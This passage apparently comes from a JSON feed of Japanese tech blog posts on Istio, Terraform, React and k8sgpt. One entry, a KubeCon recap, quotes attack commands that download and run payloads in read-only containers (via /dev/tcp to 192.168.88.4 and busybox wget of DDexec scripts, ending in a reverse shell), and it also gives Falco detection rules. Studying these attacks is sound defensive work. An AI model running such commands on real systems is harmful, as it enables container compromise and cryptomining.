宛先ポートやホストで管理しています (例：outbound|443|istio-egressgateway-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Istio EgressGateway Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:443) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、Istio EgressGateway PodにL7ロードバランシングします。宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：external.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|443|external.com) 。エンドポイントを選びます。Envoyは、エンドポイントをエントリ済システムのIPアドレスや宛先ポートで管理しています (例：:50010) 。エントリ済システムのIPアドレスは、開発者が設定する必要はなく、EnvoyがDNSから動的に取得します。  エントリ済システムにHTTPSリクエストを送信します。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio07. おわりにIstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのか、またEnvoyがどのようにHTTPSリクエストを処理するのかを解説しました。次々とサービスメッシュツールが登場したとしても、それがEnvoyを使用したサービスメッシュである限り、最終的にはEnvoyの設定値に行き着きます。そのため、抽象化されたEnvoyがどのように通信を扱うのかを一度でも理解すれば、様々なサービスメッシュツールで知識を流用できると思います。Istioはもちろん、他のEnvoyによるサービスメッシュツール (Consul、Ciliumなど) を使っている方の参考にもなれば幸いです\uD83D\uDC4D\uD83C\uDFFB謝辞今回、Kubernetesのネットワークを調査するにあたり、以下の方に知見をご教授いただきました。@ken5owata さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackオライリージャパンAmazon","isoDate":"2024-01-15T16:34:04.000Z","dateMiliSeconds":1705336444000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"k8sgpt-operator 開発メモ (ARM Mac 向け)","link":"https://zenn.dev/tozastation/articles/711f2bff2cc656","contentSnippet":"Kubernetes クラスタ構築 AMD64 コンテナ環境セットアップ ~ Lima VM ~https://github.com/lima-vm/limaGetting Started については README.md 参照Limaでは、事前に定義した内容でVMを作ることができますDocker 環境を構築する場合のサンプルも公開されていますhttps://github.com/lima-vm/lima/blob/master/examples/docker.yaml今回は、amd64 の VM を作成したいため、docker.yaml に以下の行を追記...","isoDate":"2024-01-10T00:17:57.000Z","dateMiliSeconds":1704845877000,"authorName":"tozastation","authorId":"tozastation"},{"title":"WSL の Linux から Windows のブラウザで URL を開く","link":"https://blog.1q77.com/2024/01/open-browser-in-wsl/","contentSnippet":"課題WSL の Linux 内で awscli を使って SSO 認証する場合の aws sso login 実行時や GitHub の CLI である gh (cli.github.com ) コマンドで gh auth login を実行した場合に可能であれば自動でブラウザで指定の URL が開かれますが、WSL の場合、Linux 内のブラウザを使うわけではないため何も設定していない状態だと開いてくれないのでひと手間かかって面倒です。","isoDate":"2024-01-07T11:43:53.000Z","dateMiliSeconds":1704627833000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/zatu/2023_furikaeri","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2023-06-22 3-shake SRE Tech Talk #6これまで対外向けの登壇は行なったことが無かったのでこれが登壇デビューでした。DBREノススメ所属会社である株式会社スリーシェイクの主催するイベントでしたが、一度登壇すると登壇のハードルが低くなるのでとてもいい機会でした。今の会社にDBREerポジションで入社して6か月目の登壇なので今見ると当時と違う意見の部分もあったりしますが、今もDBREもSREも何なのか分かりません。2023-09-26 YugabyteDB Japan Meetup #3別件でYugabyte Japanの方と話していたところ、登壇してみないか？ と誘われたためホイホイ話しに行った登壇でした。紹介 データベース信頼性エンジニアリングSRETTの方ではSREの存在を認知している方が多いだろうと想定して何故DBREが必要なのか？ という話しをしたのに対して、こちらではDB関係者が多いと想いDBAとDBREという切り口で発表しました。YugabyteDBはドキュメントを始めから読む活動をしていたり(2023年後半はあまり出来ていませんが)、ローカル環境で動かして遊んだりはしていたもののYugabyteDBについて話せるほどの理解は(今も)なく次にYugabyteDB Japan Meetupで話す機会があればYugabyteDBについてを主題に話したいと思いました。2023-10-12 3-shake SRE Tech Talk #76月の登壇と同様に所属会社主催のイベントでした。KubernetesでDBを動かしたい2021年ごろにDBをKubernetesで動かす記事見て以来DB on Kubernetesには興味があったのですが、Kubernetes自体やデータベースのお勉強をしていたらなかなかDB on k8sまでたどりつけていませんでした。それをイベント駆動で無理やり勉強したのがこのイベントでした。内容としてはありきたりですが、Zalando Postgres Operatorを動かしましたというだけのものですが、ここでDB on k8sをさわってからはいろいろな機会でDB on k8sを触るようになりました。2023-12-26 第44回 PostgreSQLアンカンファレンス@オンライン年内最後の登壇はPostgreSQLアンカンファレンスでした。pgrollで実現するスキーマブルーグリーンデプロイメントちょうど登壇しやすいネタを抱えてたのとアドベントカレンダーでそーだいさんが運用・開発よりの話しが足りないと書いていたのを見て、DBREを名乗っているし話さなきゃいけないだろと思ったので登壇しました。もっと運用よりだったりサービス開発だったり設計よりの話も募集中です。 大体そういうの喋る担当が自分だけなのでめちゃめちゃ需要があるので気軽にどうぞ。登壇自体はpodman-composeとdocker composeの差分で悲しいライブデモになりました。検証環境と登壇環境はそろえなきゃいけないなと思いました。ブログ関連はてなブログでは主に読んだ論文やドキュメントについてまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。はてなブログでやっているYugabyteDBのドキュメントを全部読む取り組みは途中で止ってしまっているので動かします。zennの方は社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2024年は技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。アドベントカレンダーは大風呂敷で畳みきれなかったデータベースエンジニアのためのDB on Kubernetes入門ガイドに始まり、誰得なのかわからないAlloyDB omni on Kubernetesを眺めると続いて、sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメントを書きました。ターゲットは誰だったんですかね？まとめ2023年は今までインプット重視だったところからアウトプットを考えだした年でした。これはそろそろアウトプットをしなきゃいけないという思いもあったものの、2023年1月に現職に転職し社外へのアウトプットをする人が多くいたからという面も多大にあります。人は周りの5人の平均になるという言葉があるらしいですが、まさしくその例で環境が変り周りの人が変ったため個人の方向性も変ったのではないかと思います。外部にアウトプットすることが偉いわけではありませんが、外部に発信すると新しい機会も産まれましたし1来年以降も継続していきたいです。↩","isoDate":"2023-12-31T13:00:10.000Z","dateMiliSeconds":1704027610000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2023 Recap: Attacking Kubernetes 編","link":"https://kyohmizu.hatenablog.com/entry/2023/12/31/040720","contentSnippet":"本記事は 3-shake Advent Calendar 2023 最終日の記事です。こんにちは、きょー (@kyohmizu) です少し旬を逃してしまいましたが、KubeCon NA 2023 の振り返りをしたいと思います。私はKubeConにはリアル参加しておらず、後からセッション動画を見ました。Kubernetes 編」ということで、Kubernetes へのサイバー攻撃テクニックに関するセッションを3つご紹介します。ちなみに本内容は、先日開催された CloudNative Days Tokyo 2023 にてお話しするか検討していたのですが、準備期間とセッション時間 (20分) の都合で泣く泣く諦めたものになります。 speakerdeck.comそれではセッション紹介に入ります。K8s Post-Exploitation: Privilege Escalation, Sidecar Container Injection, and Runtime Securityセッション情報Kubernetes クラスタに侵入した攻撃者が行う攻撃手法と、その対策を紹介するセッションです。最初に TeamTNT の行った攻撃キャンペーンについて、過去の調査レポートをベースに説明しています。クラスタへの初期アクセスの後、kubelet API のデフォルトポート (10250) を狙ってネットワークスキャンをかけています。スキャンによって kubelet API を発見した場合、kubelet API にPOSTリクエストを送り、最終的にノード内の全コンテナに対しクリプトマイナーをダウンロードします。詳細は調査レポートを参照いただきたいですが、攻撃コードを見るとどのように攻撃が行われるのかイメージしやすいと思います。この攻撃はアプリコンテナ内でクリプトマイナーを実行するため、早期に発見されてしまう可能性があります。そこでより発見されにくい攻撃手法として、セッション後半では「Sidecar Injection 攻撃」を取り上げています。Sidecar Injection 攻撃 は Microsoft の「Threat Matrix for Kubernetes」で紹介されている攻撃テクニックです。ちなみに MITRE ATT&CK の Containers Matrix にはこのテクニックは含まれていません。Sidecar Injection 攻撃は名前の通り、Pod 内のサイドカーコンテナを標的とします。セッション内で攻撃のサンプルコードが公開されていましたが、Pod 内のサイドカーコンテナのみを選択しクリプトマイナーを実行することを目的としているようでした。個人的にあまりピンと来なかったのは、アプリコンテナではなくサイドカーコンテナを狙うことで本当に攻撃を秘匿できるのか？という点です。サイドカーかはあまり関係ない気がします。そして最後に、これらの攻撃に対するセキュリティ対策について説明しています。Kubernetes セキュリティとして、イメージスキャンアドミッションコントロールランタイムセキュリティの3つのカテゴリを挙げ、実行中のコンテナに対する攻撃にはランタイムセキュリティが有効であると述べています。Falco を取り上げ、今回の攻撃に対する Falco ルールも公開されました。- list: shell_binaries  items: [bash, csh, ksh, sh, tcsh, zsh, dash]- macro: shell_procs  condition: proc.name in (shell_binaries)- rule: shell_in_container  desc: notice shell activity within a container  condition: >    spawned process and    container and    shell_procs  output: >    shell in a container    (user=%user.name container_id=%container.id container_name=%container.name    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)  priority: WARNINGArbitrary Code & File Execution in R/O FS – Am I Write?セッション情報readOnlyRootFilesystem: true が設定されたコンテナにおいて、コンテナ内で攻撃コードを実行するテクニックを3つ紹介しています。Readonly Filesystem では、ファイルの読み込み (Read) と実行 (Execute) はできるが書き込み (Write) ができないという特徴があります。マルウェアを配置したりすることを防止します。ファイルレスマルウェアの攻撃も存在しますが、コンテナ内に curl や wget のようなツールが含まれていなければマルウェアをダウンロードできません。それではセッション内の3つのケースについて見ていきます。ここではすべてを紹介しきれないため、より詳しく知りたい方は動画を見たりツールを調べたりしてみてください。ケース1curl や wget のようなネットワークツールがない場合、どのように攻撃コードのファイルをダウンロードするのでしょうか？/dev/tcp を利用して TCP コネクションを確立し、ファイルをダウンロードしています。ただしダウンロードしたファイルを書き込むことはできないため、メモリ上で直接実行する必要があります。これには DDExec を使い、プロセスをハイジャックすることでファイルレス実行を可能にします。$ function __bindown () {  read proto server path <<<$(echo ${1//// })  FILE=/${path// //}  HOST-${server//:*}  PORT=${server//*:}  [[ x\\"$(HOST)\\" == x\\"${PORT}\\" ]] && PORT=8080  exec 3<>/dev/tcp/${HOST]/$PORT  echo -en \\"GET ${(FILE) HTTP/1.0\\\\r\\\\nHost: $(HOST)\\\\r\\\\n\\\\r\\\\n\\" >&3  (while read line; do  [[ \\"$line\\" == $\'\\\\r\' ]] && break  done && cat) <&3  exec 3>&-}$ __bindown http://192.168.88.4:8080/shell.b64 | bash <(__bindown http://192.168.88.4:8080/ddexec.sh)base64 エンコードした攻撃用バイナリと ddexec.sh をそれぞれダウンロードし、ddexec.sh は bash で実行します。ケース2今回はコンテナイメージとして alpine を利用しています (ケース1は nginx でした)。alpine には bash が存在せず、/dev/tcp をそのまま実行することができないため、別の方法でファイルのダウンロードを試みます。curl や wget は存在しませんが、alpine には busybox がインストールされています。ファイルのダウンロードには busybox wget を利用し、ダウンロード先には Readonly RootFS の中でも書き込み可能な tmpfs を選択しています。$ mount | grep shmshm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)バイナリコードを直接実行できる ddsc.sh をダウンロードし、/dev/shm に保存します。noexec でマウントされているためファイルの実行はできませんが、ddsc.sh はシェルスクリプトなので sh から実行可能です。$ dde=$(mktemp -p /dev/shm)$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/ddsc.sh > $dde$ code=$(mktemp -p /dev/shm)$ echo \\"6a295899...60f05\\" > $code$ sh $dde -x < $codeケース3ケース2と同じマニフェストから作られた alpine コンテナの環境です。ファイルのダウンロードには引き続き busybox を利用しています。termination-log にファイルを保存し、リンカを利用してファイルを実行します。Kubernetes にはコンテナの終了メッセージを取得する機能があり、取得元ファイルのデフォルトパスが /dev/termination-log となっています。元々終了メッセージを書き込むことを想定したファイルなので、当然ながら書き込み可能です。これを攻撃用ファイルのダウンロード先に利用します。(終了メッセージの詳細は公式ドキュメントを参照ください)$ mount | grep termination-log/dev/vda1 on /dev/termination-log type ext4 (rw,relatime)mount コマンドの結果から、termination-log のマウントには noexec 属性がついていないことがわかります。これによりリンカを利用したファイル実行が可能となります。$ lddmusl libc (x86_64)Version 1.2.4_git20230717Dynamic Program LoaderUsage: /lib/ld-musl-x86_64.so.1 [options] [--] pathnameldd コマンドにより、リンカの使い方は /lib/ld-musl-x86_64.so.1 [実行ファイルのパス] であることがわかりました。あとは攻撃用ファイルをダウンロードして実行するだけです。$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/c-shell > /dev/termination-log$ /lib/ld-musl-x86_64.so.1 /dev/termination-logケース1, 2と同様、実行後にはリバースシェルが確立されています。攻撃テクニックの説明は以上となります。seccomp や SELinux の活用termination-log の場所の指定コンテナ内の通信やプロセスの監視seccomp や SELinux は対策としては一般的ですが、termination-log については聞いたことがなく、興味深い内容でした。ただしログの場所を変更できても noexec を付与する方法は見つけられなかったので、有効な対策と言えるかどうかはやや疑問が残りました。ケース2の /dev/shm を利用した攻撃については、検知するための Falco ルールも例示されました。- rule: Execution from /dev/shm  desc: This rule detects file execution from the /dev/shm directory,    a common tactic for threat actors to stash their readable+writable+(sometimes)executable files.  condition: >    spawned_process and    (proc.exe startswith \\"/dev/shm/\\" or    (proc.cwd startswith \\"/dev/shm/\\" and proc.exe startswith \\"./\\" ) or    (shell_procs and proc.args startswith \\"-c /dev/shm\\") or    (shell_procs and proc.args startswith \\"-i /dev/shm\\") or    (shell_procs and proc.args startswith \\"/dev/shm\\") or    (proc.args contains \\"/dev/shm\\" or proc.cwd startswith \\"/dev/shm\\") or    (proc.cwd startswith \\"/dev/shm/\\" and proc.args startswith \\"./\\" ))    and not container.image.repository in (falco_privileged_images, trusted_images)  output: \\"File execution detected from /dev/shm    (proc.cmdline=%proc.cmdline connection=%fd.name user.name=%user.name user.loginuid=%user.loginuid    container.id=%container.id evt.type=%evt.type evt.res=%evt.res proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid    proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid proc.exepath=%proc.exepath user.uid=%user.uid    user.loginname=%user.loginname group.gid=%group.gid group.name=%group.name container.name=%container.name image=%container.image.repository)\\"  priority: WARNING本セッションは発表者が6月に投稿した記事をもとにしているようなので、併せて読んでいただくと良いかもしれません。また資料中の Pod のマニフェストはそのまま apply するとエラーになるため、ご自身で環境を再現したい方は以下をご利用ください。ケース1:apiVersion: v1kind: Podmetadata:  name: method1-podspec:  containers:  - name: nginx    image: nginx:latest    securityContext:      readOnlyRootFilesystem: true      runAsUser: 101    ports:    - containerPort: 80    volumeMounts:    - mountPath: /var/run      name: run    - mountPath: /var/cache/nginx      name: nginx-cache  securityContext:    seccompProfile:      type: RuntimeDefault  volumes:  - name: run    emptyDir: {}  - name: nginx-cache    emptyDir: {}ケース2, 3:apiVersion: v1kind: Podmetadata:  name: method2-podspec:  containers:  - name: alpine    image: alpine    command:      - sleep    args:      - \\"3600\\"    securityContext:      readOnlyRootFilesystem: true      runAsUser: 65534  securityContext:    seccompProfile:      type: RuntimeDefaultRBACdoors: How Cryptominers Are Exploiting RBAC Misconfigsセッション情報system:anonymous ユーザーに cluster-admin ロールを付与していた場合の攻撃事例を紹介しています。cluster-admin は事前定義された ClusterRole で、クラスタ内のすべてのリソースに対する権限を持っています。system:anonymous は匿名リクエストに対して割り当てられているユーザーです。Kubernetes クラスタに対して認証なしであらゆるリソース操作ができてしまいます。今回の攻撃シナリオは以下の通りです。Kubernetes API Server をスキャンし、設定ミスのあるクラスタを発見DaemonSet としてクリプトマイナー (XMRig) を設置cluster-admin の証明書を作成し、クラスタへの侵害を永続化証明書作成の痕跡を削除興味深い点として、クリプトマイナーを設置する際に ClusterRoleBinding と DaemonSet を作成しますが、リソース名を kube-controller とすることで正規のリソースを偽装しています。運用業務でクラスタ内のリソースを確認したとしても、クリプトマイナーの存在に気づかないかもしれません。リポジトリも kubernetesio/~ のように偽装しています。また今回はCSRを削除していますが、cluster-admin を持っていれば、クラスタ内で行われる検知の回避や防御の無効化も容易にできてしまいます。クラスタとは別のレイヤーで、監査ログの監視などを行う必要があるかもしれません。パブリッククラウドを利用する場合、クラスタ内のセキュリティ対策とクラウド上の監視サービスを併用するのが良さそうです。セッション後半では、取るべきセキュリティ対策について紹介しています。Kubernetes API Server へのアクセスのネットワーク制限--anonymous-auth=false による匿名リクエストを無効化アドミッションコントローラーによる cluster-admin のバインディング禁止検知策として、設定ミスの検知Kubernetes API への攻撃の検知マイニングの検知のそれぞれ3つの対策が挙げられています。設定ミスの対策では、system:anonymous や system:authenticated に付与された権限がないか確認するためのスクリプトが紹介されています。Kubernetes の監査ログを監視することも有効です。Google Cloud の Security Command Center (SCC) には脅威検知の機能がありますが、この機能を利用すれば GKE に対する設定ミスや攻撃を検知できます。(発表者は Google Cloud の方です)マイニングの検知について、IoC (Indicator of Compromise) を利用する方法がセッション内では紹介されています。既知のマルウェアコンテナや悪意のあるバイナリ、攻撃サーバのIPアドレス等と照合することで攻撃を検知します。SCC におけるマイニング検知のベストプラクティスも興味があれば読んでみてください。おわりにいかがだったでしょうか？Kubernetes への攻撃手法を知ることは、(それ自体面白いというのもありますが) リスクベースのセキュリティ対策を検討する上で非常に有用です。このセキュリティ対策はどのような攻撃リスクを軽減してくれるのかこの攻撃が行われた場合、どのセキュリティ対策によって防ぐことができるのかといった観点で考えてみることをお勧めします。Kubernetes クラスタを目指して、皆で取り組んでいきましょう。","isoDate":"2023-12-30T19:07:20.000Z","dateMiliSeconds":1703963240000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"フォームライブラリに依存しないReactコンポーネント設計","link":"https://zenn.dev/kimitsu/articles/clean-react-form-architecture","contentSnippet":"背景React ではフォームライブラリを利用する場合、ナイーブに実装するとフォームの UI とフォームライブラリが密結合になります。これは特定のフォームライブラリに限った話ではなく、React Hook Form, Formik, React Final Form といった主要なフォームライブラリ全てで当てはまる問題です。例えば React Hook Form では、フォーム全体の設定をuseFormで行い、各属性ではregister, Controller, useControllerを使って UI と React Hook Form を接続します。つまりフォームコンポーネ...","isoDate":"2023-12-30T06:07:24.000Z","dateMiliSeconds":1703916444000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Step Functionsを利用してNAT Gatewayを自動作成/削除する","link":"https://qiita.com/ys1/items/abf8daab19f616b3d854","contentSnippet":"概要本記事ではStep Functionsを利用して、Nat Gatewayを自動で作成/削除する方法について記載します。NAT Gatewayは作成しているだけでコストがかかるリソースであり、開発環境の利用していない時間帯などは停止(削除)することでコスト削減につな...","isoDate":"2023-12-29T15:25:41.000Z","dateMiliSeconds":1703863541000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"パフォーマンスを気にするならReact Hook Formが無難","link":"https://zenn.dev/kimitsu/articles/react-form-library-performance","contentSnippet":"最近、React のフォームライブラリを調査しました。その中でパフォーマンスについての言及は見かけるものの、実際に計測しているものが見当たらなかったので計測してみました。結論としては React Hook Form でなくても良いけど、パフォーマンスを気にするなら React Hook Form を選んでおくのが無難というところに落ち着きました。 要約入力欄 10 個、CPU 6\xd7 slowdown での計測結果ライブラリ1 文字入力した場合の再描画React Hook Form8ms 前後Formik100ms 前後Formik（<F...","isoDate":"2023-12-29T14:00:56.000Z","dateMiliSeconds":1703858456000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"K8sGPT: Log Analyzer","link":"https://zenn.dev/tozastation/articles/3e2b9e887639f4","contentSnippet":"Filter 一覧➜  k8sgpt filters listActive:> ReplicaSet> PersistentVolumeClaim> Service> StatefulSet> Node> Pod> Deployment> Ingress> CronJob> ValidatingWebhookConfiguration> MutatingWebhookConfigurationUnused:> HTTPRoute> HorizontalPodAutoScaler...","isoDate":"2023-12-28T08:26:54.000Z","dateMiliSeconds":1703752014000,"authorName":"tozastation","authorId":"tozastation"},{"title":"K8sGPT: 概要","link":"https://zenn.dev/tozastation/articles/737871319fb33b","contentSnippet":"K8sGPT とはIt has SRE experience codified into its analyzers and helps to pull out the most relevant information to enrich it with AI.README.md, k8sgpt, https://github.com/k8sgpt-ai/k8sgptREADME.md の引用ですが、SRE Experience が Analyzerに体系化されており、最も関連性の高い情報を引き出してAIで補完するのに役立つと書かれています。 SRE Experien...","isoDate":"2023-12-28T07:16:37.000Z","dateMiliSeconds":1703747797000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Kubernetesのソースコードを読む Kubelet編","link":"https://qiita.com/ys1/items/7a455c602424e591fe38","contentSnippet":"起動処理Kubeletの起動処理についてソースコードを追っていき、どんな処理をしているのかみていきたいと思います。読むソースコード: バージョン: v1.27.2まず、Kubeletの起動処理について追っていきたいと思います。appパッケージのKubele...","isoDate":"2023-12-25T15:06:41.000Z","dateMiliSeconds":1703516801000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Terraformのtfstateについて考える","link":"https://blog.masasuzu.net/entry/2023/12/23/000000","contentSnippet":"この記事は3-shake Advent Calendar 2023の23日目の記事となります。3-shakeのカレンダー | Advent Calendar 2023 - QiitaこちらはSRE Tech Talk #6で話した内容に補足したものです。3-shake SRE Tech Talk #6 - connpass資料はこちらとなります。    tfstateとはtfstateの課題tfstateの管理場所をどうするか問題localS3/Google Cloud StorageGitLabTerraform Cloudtfstateを管理するリソースをどう管理する問題aws/gcloud コマンドterraform + local state 管理CloudFormation / Google Deployment Managertfstateをどう分割するか問題環境分離パターンディレクトリ分離パターンbackend-configパターンworkspace環境分離以外の分割をどうするか問題分割する観点プロバイダーで分割管理権限で分割変更頻度で分割依存の方向性で分割tfstate間のリソース参照まとめtfstateとはTerraformが管理しているリソースの状態を表すjson形式のファイルです。tfstateとterraformファイルと実際のリソースの状態を比較して、terraformコマンドが実行されます。一般的には直接変更せずterraform stateコマンドを通して変更を行い、一般ユーザがtfstateに触れることはないです。参考: Backend Configuration - Configuration Language | Terraform | HashiCorp Developertfstateの課題tfstateについて以下の課題があります。それぞれについて見ていきます。tfstateの管理場所tfstateを管理するリソースの管理tfstateの分割tfstateの管理場所をどうするか問題主な保存場所候補としては以下のものがあります。local(デフォルト)クラウドのオブジェクトストレージS3/Google Cloud StorageGitレポジトリ統合GitLabSaaS利用Terraform CloudlocalTerraformのデフォルト保存先です。Terraformを実行する同じディレクトリのterraform.tfstateに保存されます。1人もしくは変更頻度が著しく低い状況など特殊なとき使えるものとなります。git管理して複数人で使うこともできるが、コンフリクトが発生しうるので、チーム開発には向かないです。基本的には複数人でterraformを使用するときは非推奨です。参考: Backend Type: local | Terraform | HashiCorp DeveloperS3/Google Cloud Storage監理するクラウドのオブジェクトストレージに保存する方法です。これが標準的(当社比)なのかなと思っています。オブジェクトストレージなので、権限があればどこからでもアクセスすることができます。それゆえ、同時にTerraformが実行されるので排他ロックの処理が必要となります。S3バックエンドを使用した場合はDynamoDBを使用してstate lockを実現します。Google Cloud Storageは単体でstate lockをサポートしています。tfstateの参照権限をクラウドのIAMで制御する必要があります。参考: Backend Type: s3 | Terraform | HashiCorp Developer参考: Backend Type: gcs | Terraform | HashiCorp DeveloperGitLabGitLabでtfstateを監理することもできます。tfstateを管理するリソースを管理する必要がないことがメリットとなります。(後述します)開発にGitLabを使っている場合、親和性が高い方法となります。参考: GitLab-managed Terraform state | GitLabTerraform CloudGitLabと同様tfstateを管理するリソースを管理する必要がないというところにメリットがあります。月間500 Managed Rsourcesまで無料で使えます。参考: HashiCorp Terraform: Enterprise Pricing, Packages & Featuresweb上からリソース差分の確認できたり、applyが可能です。SaaSにクラウドのリソース情報を預けることに抵抗がない場合は選択肢としては有望です。なおTerraformのStateのドキュメントではこういう記述があり、Terraform Cloudを推奨しているようです。This state is stored by default in a local file named \\"terraform.tfstate\\", but we recommend storing it in Terraform Cloud to version, encrypt, and securely share it with your team.参考: State | Terraform | HashiCorp Developer昔はAWSと連携するためにIAM Userのアクセスキーを使わないといけなかったが、OIDC認証もできるようになったので、よりやりやすくなったかと思います。参考: Terraform Cloud Adds Dynamic Provider Credentials for Vault and Official Cloud Providers参考: Terraform Cloud | Terraform | HashiCorp Developertfstateを管理するリソースをどう管理する問題GitLabやTerraform Cloudを使う場合には起きない問題となります。S3のようなクラウドのオブジェクトストレージを使用する場合は、このS3バケットをどう作るかということが問題となります。コマンドで作る場合、コマンドの管理、terraformで作る場合はそのtfstateはどこに保存するか、そういったことに頭を悩ませます。そこについて考えていきます。以下の方法が考えられます。aws/gcloudコマンドterraform + local state管理CloudFormationaws/gcloud コマンドそもそも作成コマンドしか打たないのであれば、スクリプトをレポジトリに含めておけば良いという考え方はあります。基本的に一度作れば変えることはないので、これで十分という風に割り切ることはできます。ただし、tfstateのバケットだけでなく、CI/CD用のIAM RoleやOIDC認証リソースなども初期リソースとして含めて管理したいというユースケースだと、スクリプト管理では力不足になりうります。terraform + local state 管理オブジェクトストレージをterraformで作る方法です。ただし、tfstateに関してはlocalに保存し、これをgitも管理します。かたくなにterraformを使いたい人に向けな方法となります。デメリットとしては、tfstateもgit管理するのでコミット忘れがあります。また、頻度低いですがterraform自体はローカルで実行せざるを得ないので変更衝突が起きうることです。CloudFormation / Google Deployment Managerクラウドごとにコードを変えないといけない。IaCツールを2種類使うというそこはかとない気持ち悪さはあるというデメリットはありますが、gitでインフラ状態管理しなくてすむというメリットがあります。気持ち悪さだけを克服できるなら無難な選択肢だとは思います。tfstateをどう分割するか問題第一に考えるのが環境の分離。この分離の仕方だけ他とは系統が違うので独立して説明します。一部差分があるだけで、以下のような形でほぼ同じ構成の環境を作ることはよくあります。開発環境ステージング環境本番環境これらについてどう分割するのかを考えていきます。環境分離パターン大きく2つのパターンを利用することが多いです。それぞれ見ていきます。ディレクトリ分離パターンbackend-configパターンディレクトリ分離パターンこれは環境ごとにディレクトリを分割して、環境ディレクトリを実行単位とします。環境の切り替えはディレクトリ移動することで行います。環境ごとの差分が大きいときに使うことが多いです。デメリットとしては環境ごとにリソース定義をそれぞれ書くので記述量が多くなるというのがあります。そのため、可能な限りモジュール化して、なるべくパラメータだけの差分にするようにします。ディレクトリ構成例としては以下の通りです。.├── envs│   ├── dev│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   ├── prd│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   └── stg│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf└── modules    ├── vpc    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tf    ├── application    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tfbackend-configパターンbackend-configオプションとvars-fileオプションを組み合わせて、環境を切り替えるパターンです。${ENVDIR}/terraform.tfvars に環境ごとの差分パラメータを定義して、${ENVDIR}/backend.tfvars に環境ごとのtfstate保存先を定義します。terraform init で backend.tfvars を切り替えることで環境の切り替えを行います。環境ごとに差分が少ないときに向いています。差分は terraform.tfvars に記述されているパラメータだけなので、記述量が少なくて済みます。ただし差分が多くなるとcount, for_eachで分岐やループを作ることになり読みにくくなるというものがあります。ディレクトリ構成例としては以下のようになります。.├── envs│   ├── dev│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   ├── prd│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   └── stg│       ├── backend.tfvars│       └── terraform.tfvars├── locals.tf├── main.tf├── modules│   └── vpc│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf├── outputs.tf├── provider.tf└── variables.tf設定ではbackendをs3と指定しておき中身はオプションで指定するようにします。terraform {  backend \\"s3\\" {}}以下のようにterraform initするたびに適用する環境を切り替えることができる。terraform init --backend-config=${ENVDIR}/backend.tfvars --reconfigureterraform apply --var-file=${ENVDIR}/terraform.tfvarsworkspaceworkspaceは同じような環境を複製するときに使ういます。シングルテナント環境を量産する場合や開発環境を複数作る場合などに使います。環境を切り替える用途には作られてないとドキュメントまでは記載されています。参考: Managing Workspaces - Terraform CLI | Terraform | HashiCorp DeveloperIn particular, organizations commonly want to create a strong separation between multiple deployments of the same infrastructure serving different development stages or different internal teams. In this case, the backend for each deployment often has different credentials and access controls. CLI workspaces within a working directory use the same backend, so they are not a suitable isolation mechanism for this scenario.自分自身がworkspaceを実運用で使ったことがないので多くは語れないです。別でちゃんと使ってから書きたいと思います。参考: State: Workspaces | Terraform | HashiCorp 